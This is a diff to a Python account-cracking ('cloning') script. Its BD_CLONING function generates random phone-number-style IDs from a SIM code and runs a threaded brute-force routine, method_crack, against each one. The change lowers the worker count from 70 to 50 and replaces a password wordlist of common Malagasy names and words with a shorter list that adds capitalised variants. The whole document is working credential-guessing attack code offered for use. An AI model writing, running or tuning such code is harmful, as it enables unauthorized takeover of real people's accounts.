@@ -108,7 +108,7 @@ def BD_CLONING():
     for nmbr in range(limit):
         nmp=''.join(map(str, generate_random_sequence(7)))
         user.append(nmp)
-    with tred(max_workers=70) as Dipto:
+    with tred(max_workers=50) as Dipto:
         tl=str(len(user))
         print(' TOTAL ACCOUNT : '+tl)
         print(' YOUR SIM CODE : '+code)
@@ -116,7 +116,7 @@ def BD_CLONING():
         linex()
         for psx in user:
             ids=code+psx
-            passlist=[psx,ids,ids[:6],ids[:6],ids[5:],'papako','fitahina','fanomezana','malala','hasina','nomena','namako','fitiavako','mamako','vadiko','safidy','mahefa','mahefa','tantely','heritina','faneva','tolotra','mandresy','jessica','mahery','valisoa','fifalina','nilaina','fanantenana','fitiavana','koloina','harena','faniry','hasina','nirina','nekena','faniry','dadako','fifalina','lafatra','anjara','lahatra','miangaly','fahendrena','rakotomalala','randria','malalako','fandresena','malala','finaritra','mandresy','fiderana','mendrika','namako','solofoniaina','andria','rakoto','tahiry','valisoa','seheno','felana','finoana','fitiavako','rojotiana','solofo','diamondra','tsilavina','maminirina','fifaliana','fahendrena','fiderana','fandresena','nekena','fanantenana','nirina','nantenaina','tolotra','jesosy','faneva','milely','mamisoa','narindra','sarobidy','sarindra','malagasy','mamiko','lahatra','finoana']
+            passlist=[psx,ids,ids[:6],ids[:6],ids[5:],'papako','Papako','mamako','Mamako','safidy','Safidy','mahefa','Mahefa','harena','Harena','fitiavana','Fitiavana','sarobidy','Sarobidy','fitiavako','valisoa','Valisoa','finoana','Finoana','namako','hasina','Hasina','malala','Malala','faniry','Faniry','fanantenana','Fanantenana','nekena','Nekena','fifalina','Fifalina','fitahina','Fitahina','faniry','Faniry','mandresy','Mandresy','fiderana','Fiderana','fandresena','Fandresena','Nilaina','nilaina','diamondra','Diamondra','fanomezana','Fanomezana','mendrika','Mendrika']
             Dipto.submit(method_crack,ids,passlist)
     linex()
     print(' LE CLONING EST FINI ')
